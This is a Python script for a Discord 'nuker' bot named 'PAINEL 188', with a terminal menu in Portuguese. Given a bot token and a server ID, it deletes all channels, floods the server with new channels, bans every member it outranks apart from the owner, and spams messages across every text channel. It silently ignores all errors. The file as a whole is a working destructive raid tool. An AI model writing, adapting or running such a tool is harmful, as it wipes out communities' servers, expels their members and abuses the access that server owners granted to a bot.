import discord
import asyncio
import os
import colorama
from colorama import Fore, Style

colorama.init(autoreset=True)

# Configuração de intenções
intents = discord.Intents.all()
client = discord.Client(intents=intents)

# --- Interface PAINEL 188 ---
BANER = f"""{Fore.BLUE}{Style.BRIGHT}
  ____    _     ___ _   _  _____ _       _  ___  ___  
 |  _ \  / \   |_ _| \ | || ____| |     / |( _ )( _ ) 
 | |_) |/ _ \   | ||  \| ||  _| | |     | |/ _ \/ _ \ 
 |  __/ ___ \  | || |\  || |___| |___  | | (_) (_) |
 |_| /_/   \_\|___|_| \_||_____|_____| |_|\___/\___/ 
                                                      
{Fore.CYAN}--------------------------------------------------
      PAINEL 188 - MODO SEQUENCIAL
--------------------------------------------------
"""

MENU = f"""{Fore.BLUE}
┌───────────────────┬───────────────────┐
│ (1) Excluir Canais│ (3) Banir Todos   │
├───────────────────┼───────────────────┤
│ (2) Criar Canais  │ (4) Spam Global   │
├───────────────────┴───────────────────┤
│              (5) Sair                 │
└───────────────────────────────────────┘
"""

# --- Funções de Ação ---

async def excluir_canais(guild):
    print(f"{Fore.RED}[!] Deletando canais...")
    for channel in guild.channels:
        try: await channel.delete()
        except: pass
    print(f"{Fore.GREEN}[+] Canais limpos.")

async def criar_canais(guild):
    nome = input(f"{Fore.CYAN}Nome dos canais: ")
    qtd = int(input(f"{Fore.CYAN}Quantidade: "))
    for _ in range(qtd):
        try: await guild.create_text_channel(nome)
        except: pass
    print(f"{Fore.GREEN}[+] Canais criados.")

async def banir_todos(guild):
    print(f"{Fore.RED}[!] Banindo membros...")
    count = 0
    for member in guild.members:
        if member.top_role < guild.me.top_role and member != guild.owner:
            try:
                await member.ban(reason="PAINEL 188")
                count += 1
                print(f"{Fore.YELLOW}[-] Banido: {member.name}")
            except: pass
    print(f"{Fore.GREEN}[+] {count} membros banidos.")

async def spam_todos_canais(guild):
    conteudo = input(f"{Fore.CYAN}Mensagem: ")
    repeticoes = int(input(f"{Fore.CYAN}Vezes por canal: "))
    for i in range(repeticoes):
        for canal in guild.text_channels:
            try: await canal.send(conteudo)
            except: pass
        await asyncio.sleep(0.00)
    print(f"{Fore.GREEN}[+] Spam finalizado.")

# --- Loop de Comando ---

@client.event
async def on_ready():
    os.system('clear' if os.name == 'posix' else 'cls')
    print(BANER)
    print(f"{Fore.WHITE}Bot logado: {client.user}")
    
    id_s = input(f"{Fore.CYAN}ID do Servidor: ")
    try:
        guild = client.get_guild(int(id_s))
    except:
        guild = None
    
    if not guild:
        print(f"{Fore.RED}Erro: Servidor não encontrado.")
        return

    while True:
        print(MENU)
        op = input(f"{Fore.WHITE}PAINEL 188 > ")

        if op == "1":
            await excluir_canais(guild)
        elif op == "2":
            await criar_canais(guild)
        elif op == "3":
            await banir_todos(guild)
        elif op == "4":
            await spam_todos_canais(guild)
        elif op == "5":
            print(f"{Fore.RED}Desconectando..."); await client.close(); break
        else:
            print(f"{Fore.YELLOW}Opção inválida!")

# Execução
token = input("Digite o Token do Bot: ")
client.run(token)